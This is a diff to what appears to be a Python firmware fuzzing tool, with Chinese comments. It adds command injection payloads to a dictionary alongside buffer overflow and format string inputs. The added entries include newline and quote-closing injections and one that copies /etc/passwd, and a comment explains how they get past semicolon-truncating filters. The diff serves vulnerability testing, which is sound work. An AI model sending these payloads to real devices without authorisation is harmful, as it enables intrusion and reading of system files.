@@ -18,10 +18,18 @@ import urllib.parse
 
 # 载荷按「由轻到重」排序：先试小的，崩了才加码，避免一上来就把服务打挂。
 # 类别名跟词表（fwmap/data/taint.txt）里的保持一致：bof / ci（命令注入）/ fmt
+#
+# ci 里为什么有换行载荷：固件里命令常常是
+#     sprintf(cmd, "echo '%s' > /tmp/x", param);  system(cmd);
+# 值被包在**单引号**里，而且不少实现会先 `while (*p != ';') p++; *p = 0;`
+# 在第一个分号处截断 —— 所以 `;id;` 这类经典载荷打不进去。
+# 真正有效的是「单引号闭合 + 换行」：换行不被截断，闭合引号后就能起新命令。
 PAYLOADS: dict[str, list[str]] = {
     "bof": ["A" * 64, "A" * 200, "A" * 512, "A" * 1024, "A" * 2048],
-    "ci": [";id;", "`id`", "$(id)", "|id"],
-    "cmd": [";id;", "`id`", "$(id)", "|id"],
+    "ci": [";id;", "`id`", "$(id)", "|id",
+           "'\nid\n'", "\nid\n", "'\ncp /etc/passwd /tmp/pwned\n'"],
+    "cmd": [";id;", "`id`", "$(id)", "|id",
+            "'\nid\n'", "\nid\n", "'\ncp /etc/passwd /tmp/pwned\n'"],
     "fmt": ["%08x." * 8, "%08x." * 32, "%s%s%s%s" * 8],
 }
 DEFAULT_PAYLOAD = ["A" * 512, ";id;"]
